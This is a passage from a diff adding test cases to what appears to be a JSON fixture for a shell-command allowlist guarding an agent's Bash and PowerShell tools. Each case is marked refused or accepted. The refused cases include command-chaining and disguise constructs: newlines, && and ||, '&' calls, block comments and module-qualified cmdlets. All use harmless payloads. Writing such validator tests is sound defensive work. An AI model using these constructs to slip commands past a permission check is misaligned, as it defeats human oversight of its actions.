+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "script block or brace",
+  "tool": "PowerShell",
+  "command": "Where-Object { $_ }",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "script block or brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "newline",
+  "tool": "PowerShell",
+  "command": "ls\nls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "newline"
+ },
+ {
+  "source": "gen-p0",
+  "id": "|| (PowerShell 7",
+  "tool": "PowerShell",
+  "command": "ls || ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "|| (PowerShell 7"
+ },
+ {
+  "source": "gen-p0",
+  "id": "&& (PowerShell 7",
+  "tool": "PowerShell",
+  "command": "ls && ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "&& (PowerShell 7"
+ },
+ {
+  "source": "gen-p0",
+  "id": "& call of anything but gh",
+  "tool": "PowerShell",
+  "command": "& ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "& call of anything but gh"
+ },
+ {
+  "source": "gen-p0",
+  "id": "& call of anything but gh",
+  "tool": "PowerShell",
+  "command": "ls; & cat x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "& call of anything but gh"
+ },
+ {
+  "source": "gen-p0",
+  "id": "< (redirect, block comment or here-string)",
+  "tool": "PowerShell",
+  "command": "<# c #> ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "< (redirect, block comment or here-string)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "module-qualified cmdlet",
+  "tool": "PowerShell",
+  "command": "Microsoft.PowerShell.Management\\Get-Item x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "module-qualified cmdlet"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown parameter -Bogus for set-content",
+  "tool": "PowerShell",
+  "command": "Set-Content -Bogus x y",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown parameter -Bogus for set-content"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown parameter -ErrorAction for set-content",
+  "tool": "PowerShell",
+  "command": "Set-Content -ErrorAction 0 y x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown parameter -ErrorAction for set-content"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown parameter -EA for set-content",
+  "tool": "PowerShell",
+  "command": "Set-Content -EA 0 y x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown parameter -EA for set-content"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown parameter -OutVariable for set-content",
+  "tool": "PowerShell",
+  "command": "Set-Content -OutVariable o y x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown parameter -OutVariable for set-content"
+ },
+ {
+  "source": "gen-p0",
+  "id": "ambiguous parameter -F for get-childitem",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem -F",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "ambiguous parameter -F for get-childitem"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown cmdlet (Export-Csv)",
+  "tool": "PowerShell",
+  "command": "Export-Csv -Path x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown cmdlet (Export-Csv)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "unknown cmdlet (Get-Foo)",
+  "tool": "PowerShell",
+  "command": "Get-Foo x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "unknown cmdlet (Get-Foo)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "339",
+  "tool": "Bash",
+  "command": "ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "340",
+  "tool": "Bash",
+  "command": "ls -la",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "341",
+  "tool": "Bash",
+  "command": "git status",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "342",
+  "tool": "Bash",
+  "command": "git log --oneline -5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "343",
+  "tool": "Bash",
+  "command": "git diff HEAD",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "344",
+  "tool": "Bash",
+  "command": "git add -A",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "345",
+  "tool": "Bash",
+  "command": "git commit -m 'msg'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "346",
+  "tool": "Bash",
+  "command": "git commit -F docs/loops/m.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "347",
+  "tool": "Bash",
+  "command": "git fetch origin",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "348",
+  "tool": "Bash",
+  "command": "git pull",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "349",
+  "tool": "Bash",
+  "command": "git branch -a",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "350",
+  "tool": "Bash",
+  "command": "git show HEAD",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "351",
+  "tool": "Bash",
+  "command": "git rev-parse HEAD",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "352",
+  "tool": "Bash",
+  "command": "git push origin loop/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "353",
+  "tool": "Bash",
+  "command": "git push origin qa/t194-r6-y",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "354",
+  "tool": "Bash",
+  "command": "gh pr list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "355",
+  "tool": "Bash",
+  "command": "gh pr view 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "356",
+  "tool": "Bash",
+  "command": "gh pr checkout 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "357",
+  "tool": "Bash",
+  "command": "gh pr comment 5 --body hi",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "358",
+  "tool": "Bash",
+  "command": "gh pr diff 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "359",
+  "tool": "Bash",
+  "command": "gh run list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "360",
+  "tool": "Bash",
+  "command": "gh run view 123",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "361",
+  "tool": "Bash",
+  "command": "gh api repos/x/y",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "362",
+  "tool": "Bash",
+  "command": "cat README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "363",
+  "tool": "Bash",
+  "command": "head -5 README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "364",
+  "tool": "Bash",
+  "command": "tail -5 README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "365",
+  "tool": "Bash",
+  "command": "wc -l README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "366",
+  "tool": "Bash",
+  "command": "grep foo README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "367",
+  "tool": "Bash",
+  "command": "diff a.txt b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "368",
+  "tool": "Bash",
+  "command": "echo hi",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "369",
+  "tool": "Bash",
+  "command": "echo hi > C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "370",
+  "tool": "Bash",
+  "command": "echo hi >> C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "371",
+  "tool": "Bash",
+  "command": "cat a.txt | wc -l",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "372",
+  "tool": "Bash",
+  "command": "ls -la | head -5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "373",
+  "tool": "Bash",
+  "command": "git status && git log --oneline -3",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "374",
+  "tool": "Bash",
+  "command": "ls; wc -l README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "375",
+  "tool": "Bash",
+  "command": "ls | grep x || echo none",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "376",
+  "tool": "Bash",
+  "command": "git commit -m 'a > b; c'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "377",
+  "tool": "Bash",
+  "command": "git commit -m \"plain text\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "378",
+  "tool": "Bash",
+  "command": "NODE_ENV=test npm test",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "379",
+  "tool": "Bash",
+  "command": "GIT_PAGER=cat git log",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "380",
+  "tool": "Bash",
+  "command": "cp a.txt C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "381",
+  "tool": "Bash",
+  "command": "mv a.txt C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "382",
+  "tool": "Bash",
+  "command": "tee C:/qa-tmp/o.txt < a.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "383",
+  "tool": "Bash",
+  "command": "env ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "384",
+  "tool": "Bash",
+  "command": "command ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "385",
+  "tool": "Bash",
+  "command": "nohup ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "386",
+  "tool": "Bash",
+  "command": "sh -c 'ls'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "387",
+  "tool": "Bash",
+  "command": "sh -c 'git status'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "388",
+  "tool": "Bash",
+  "command": "ls 2> C:/qa-tmp/e.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "389",
+  "tool": "Bash",
+  "command": "ls > C:/qa-tmp/o.txt 2>&1",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "390",
+  "tool": "Bash",
+  "command": "ls &> C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "391",
+  "tool": "Bash",
+  "command": "git -c user.name=q status",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "392",
+  "tool": "Bash",
+  "command": "npm test",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "393",
+  "tool": "Bash",
+  "command": "npm run build",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "394",
+  "tool": "Bash",
+  "command": "npx tsc --noEmit",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "395",
+  "tool": "Bash",
+  "command": "node build/x.js",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "396",
+  "tool": "Bash",
+  "command": "sed -i 's/a/b/' C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "397",
+  "tool": "Bash",
+  "command": "sed 's/a/b/' a.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "398",
+  "tool": "Bash",
+  "command": "gh pr merge 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "399",
+  "tool": "Bash",
+  "command": "gh pr merge 2 --squash",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "400",
+  "tool": "Bash",
+  "command": "gh pr merge '#7'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "401",
+  "tool": "Bash",
+  "command": "gh pr merge --squash 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "402",
+  "tool": "Bash",
+  "command": "git tag v1",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "403",
+  "tool": "Bash",
+  "command": "git merge feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "404",
+  "tool": "Bash",
+  "command": "git push --force origin loop/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "405",
+  "tool": "Bash",
+  "command": "install a.txt C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "406",
+  "tool": "Bash",
+  "command": "git status -s",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "407",
+  "tool": "Bash",
+  "command": "git log -p",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "408",
+  "tool": "Bash",
+  "command": "git log --stat",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "409",
+  "tool": "Bash",
+  "command": "git diff --cached",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "410",
+  "tool": "Bash",
+  "command": "git show --stat HEAD",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "411",
+  "tool": "Bash",
+  "command": "git blame README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "412",
+  "tool": "Bash",
+  "command": "git stash list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "413",
+  "tool": "Bash",
+  "command": "git remote -v",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "414",
+  "tool": "Bash",
+  "command": "git config --get user.name",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "415",
+  "tool": "Bash",
+  "command": "git reflog",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "416",
+  "tool": "Bash",
+  "command": "git ls-files docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "417",
+  "tool": "Bash",
+  "command": "git rev-list --count HEAD",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "418",
+  "tool": "Bash",
+  "command": "git describe --tags",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "419",
+  "tool": "Bash",
+  "command": "git shortlog -s",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "420",
+  "tool": "Bash",
+  "command": "gh pr status",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "421",
+  "tool": "Bash",
+  "command": "gh pr ready 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "422",
+  "tool": "Bash",
+  "command": "gh issue list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "423",
+  "tool": "Bash",
+  "command": "gh issue view 3",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "424",
+  "tool": "Bash",
+  "command": "gh repo view",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "425",
+  "tool": "Bash",
+  "command": "gh workflow list",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "426",
+  "tool": "Bash",
+  "command": "gh run watch 123",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "427",
+  "tool": "Bash",
+  "command": "cat docs/loops/x.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "428",
+  "tool": "Bash",
+  "command": "sort README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "429",
+  "tool": "Bash",
+  "command": "uniq a.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "430",
+  "tool": "Bash",
+  "command": "cut -f1 a.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "431",
+  "tool": "Bash",
+  "command": "sed 's/a/b/' README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "432",
+  "tool": "Bash",
+  "command": "awk '{print}' README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "433",
+  "tool": "Bash",
+  "command": "comm a.txt b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "434",
+  "tool": "Bash",
+  "command": "ls docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "435",
+  "tool": "Bash",
+  "command": "pwd",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "436",
+  "tool": "Bash",
+  "command": "whoami",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "437",
+  "tool": "Bash",
+  "command": "git commit --amend -m 'x'",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "438",
+  "tool": "Bash",
+  "command": "git fetch --all",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "439",
+  "tool": "Bash",
+  "command": "git pull --rebase",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "440",
+  "tool": "Bash",
+  "command": "git branch -d feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "441",
+  "tool": "Bash",
+  "command": "git checkout README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "442",
+  "tool": "Bash",
+  "command": "git restore README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "443",
+  "tool": "Bash",
+  "command": "echo done > C:/qa-tmp/d.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "444",
+  "tool": "Bash",
+  "command": "true && echo ok",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "445",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "446",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "447",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem -Recurse docs",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "448",
+  "tool": "PowerShell",
+  "command": "Get-Content README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "449",
+  "tool": "PowerShell",
+  "command": "Get-Content README.md -TotalCount 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "450",
+  "tool": "PowerShell",
+  "command": "Get-Content -Path README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "451",
+  "tool": "PowerShell",
+  "command": "Test-Path README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "452",
+  "tool": "PowerShell",
+  "command": "Select-String foo README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "453",
+  "tool": "PowerShell",
+  "command": "Get-Item README.md",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "454",
+  "tool": "PowerShell",
+  "command": "Write-Output hi",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "455",
+  "tool": "PowerShell",
+  "command": "Write-Host hi",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "456",
+  "tool": "PowerShell",
+  "command": "Set-Content C:/qa-tmp/o.txt -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "457",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path C:/qa-tmp/o.txt -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "458",
+  "tool": "PowerShell",
+  "command": "Set-Content -LiteralPath C:/qa-tmp/o.txt x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "459",
+  "tool": "PowerShell",
+  "command": "Add-Content C:/qa-tmp/o.txt -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "460",
+  "tool": "PowerShell",
+  "command": "Out-File -FilePath C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "461",
+  "tool": "PowerShell",
+  "command": "New-Item -Path C:/qa-tmp/o.txt -ItemType File",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "462",
+  "tool": "PowerShell",
+  "command": "Copy-Item a.txt C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "463",
+  "tool": "PowerShell",
+  "command": "Move-Item a.txt C:/qa-tmp/b.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "464",
+  "tool": "PowerShell",
+  "command": "Remove-Item C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "465",
+  "tool": "PowerShell",
+  "command": "Get-ChildItem docs | Select-Object -First 5",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "466",
+  "tool": "PowerShell",
+  "command": "Get-Content README.md | Measure-Object -Line",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "467",
+  "tool": "PowerShell",
+  "command": "Write-Output x > C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "468",
+  "tool": "PowerShell",
+  "command": "Write-Output x >> C:/qa-tmp/o.txt",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "469",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path:C:/qa-tmp/o.txt -Value x",
+  "cwd": "",
+  "expect": null,
+  "kind": "accepted",
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "470",
